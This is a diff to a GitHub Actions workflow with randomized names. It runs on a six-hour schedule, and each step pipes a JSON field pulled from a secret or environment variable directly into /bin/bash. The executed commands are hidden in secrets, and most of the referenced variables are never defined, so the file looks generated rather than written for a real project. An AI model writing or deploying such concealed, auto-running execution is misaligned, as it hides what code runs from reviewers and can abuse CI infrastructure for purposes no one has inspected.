@@ -1,10 +1,11 @@
 name: gunnageterracotta
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '33 1/6 * * *'
 
-jobs:  # 5963
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,8 +13,13 @@ jobs:  # 5963
       - uses: actions/checkout@v4
       - name: gunnageterracotta
         env:
-          jfpw2: ${{ secrets.jfpw2 }}
+          iagh648: ${{ secrets.iagh648 }}
         run: |
-          echo $jfpw2 | jq -r .jwd3 | /bin/bash
-          echo $t98266 | jq -r .olgmc8416 | /bin/bash
+          echo $iagh648 | jq -r .ayesd3 | /bin/bash
+          echo $tyk74013 | jq -r .cxty0119 | /bin/bash
+          echo $j37 | jq -r .avt7 | /bin/bash
+          echo $i1254 | jq -r .p0 | /bin/bash
+          echo $b09 | jq -r .gqja6 | /bin/bash
+          echo $ko520 | jq -r .otrvn05202 | /bin/bash
+          echo $z1584 | jq -r .k927 | /bin/bash
 
